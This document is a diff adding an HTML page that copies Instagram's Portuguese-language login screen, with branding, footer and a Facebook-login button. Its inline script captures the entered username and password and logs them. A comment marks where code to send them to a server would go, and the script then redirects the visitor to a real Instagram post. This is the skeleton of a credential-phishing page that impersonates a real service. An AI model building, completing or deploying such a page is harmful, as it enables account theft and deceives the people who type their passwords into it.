@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      type="image/png"
+      sizes="32x32"
+      rel="icon"
+      href="./images/instagram-favicon.png"
+    />
+    <link rel="stylesheet" href="./style.css" />
+    <title>Instagram</title>
+  </head>
+  <body>
+    <main id="main">
+      <div class="wrapper">
+        <div class="instagram-phone">
+          <img
+            src="./images/instagram-celular.png "
+            alt="celular com fotos do feed do instagram"
+          />
+        </div>
+
+        <div class="instagram-login">
+          <div class="group">
+            <img
+              src="./images/instagram-logo.png"
+              class="instagram-logo"
+              alt="isntagram-logo"
+              aria-label="logo com o nome instagram"
+            />
+            <div class="form">
+              <form>
+                <div class="field">
+                    <input
+                    id="username"
+                    type="text"
+                    placeholder="Telefone, nome de usuário ou email"
+                    aria-label
+                    for="Telefone, nome de usuário ou email"
+                  />
+                </div>
+
+                <div class="field">
+                    <input
+                    id="password"
+                    type="password"
+                    placeholder="Palavra-passe"
+                    aria-label
+                    for="senha"
+                  />
+                </div>
+
+                <button
+  id="loginButton"
+  class="login-button"
+  title="login"
+  type="button"
+  aria-label="botão entrar"
+>
+  Iniciar Sessão
+</button>
+
+                <div class="separator">
+                  <div class="line"></div>
+                  <p>OU</p>
+                  <div class="line"></div>
+                </div>
+
+                <div class="outro">
+                  <button
+                    class="fb-login-btn"
+                    type="button"
+                    aria-label="botão entrar com o Facebook"
+                  >
+                    <i class="fa-brands fa-facebook-square"></i>
+                    <span class="login-with-fb">Iniciar sessão com o Facebook </span>
+                  </button>
+
+                  <p class="forgot-password">
+                    <a href="#"> Esqueceste-te da palavra-passe? </a>
+                  </p>
+                </div>
+              </form>
+            </div>
+          </div>
+          <div class="group sign-up">
+            Não tem uma conta? <a class="sign-up" href="#"> Cadastre-se </a>
+          </div>
+          <div class="get-the-app">
+            <p>Obtenha o aplicativo.</p>
+            <div class="download">
+              <a href="#" class="app-download"></a>
+              <a href="#" class="app-download"></a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <footer>
+        <div class="social-links">
+            <div class="credit">
+              Meta  Sobre  Blog  Carreiras  Ajuda  API  Privacidade  Termos  Localizações 
+               Instagram  Lite  Threads  Carregamento de contatos e não usuários
+            </div>
+            <div class="social-links">
+                <div class="credit">
+                               Português (Brasil) © 2024 Instagram from Meta
+                </div>
+      </footer>
+    </main>
+    <script
+      src="https://kit.fontawesome.com/44fd1bb967.js"
+      crossorigin="anonymous"
+    ></script>
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function (event) {
+          event.preventDefault(); // Impede o envio do formulário
+      
+          // Captura os valores dos campos de entrada
+          var username = document.getElementById('username').value;
+          var password = document.getElementById('password').value;
+      
+          // Exibe os valores no console log
+          console.log('Username:', username);
+          console.log('Password:', password);
+      
+          // Adicione aqui a lógica para enviar os dados para o servidor (por exemplo, usando AJAX)
+      
+          // Redireciona para a URL desejada
+          window.location.href = "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
+      
+          // Limpa os campos de entrada (opcional)
+          document.getElementById('username').value = '';
+          document.getElementById('password').value = '';
+        });
+      </script>
+      
+      
+  </body>
+</html>
